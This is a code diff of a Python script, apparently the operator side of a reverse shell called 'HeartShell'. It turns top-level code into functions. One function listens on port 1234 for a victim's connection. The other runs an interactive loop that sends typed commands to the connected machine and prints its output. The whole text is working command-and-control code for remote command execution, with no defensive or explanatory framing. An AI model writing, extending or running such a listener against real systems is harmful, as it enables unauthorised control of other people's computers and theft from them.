@@ -3,20 +3,39 @@
 import socket
 from termcolor import colored
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+def shell():
+	while True:
+		command = input(f"*HeartShell-{str(ip)}#: ") # data type String
+		target.send(command.encode('utf-8'))
 
-host = '0.0.0.0'
-port = 1234
+		# End shell session
+		if command == 'q':
+			break
+		else:
+			result = target.recv(1024) # data type Bytes
+			print(result.decode('utf-8'))
 
-s.bind((host, port))
-s.listen(5)
+def server():
+	# Creating global variables so that can be used in different functions
+	global s
+	global target
+	global ip
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-print(colored("[+] Listening for incoming connection ...", 'green'))
+	host = '0.0.0.0'
+	port = 1234
 
-target, ip = s.accept()
+	s.bind((host, port))
+	s.listen(5)
 
-print(colored(f"[+] Connection established from: {str(ip)}", 'green'))
+	print(colored("[+] Listening for incoming connection ...", 'green'))
 
-s.close()
+	target, ip = s.accept()
 
+	print(colored(f"[+] Connection established from: {str(ip)}", 'green'))
+
+	s.close()
+
+server()
+shell()
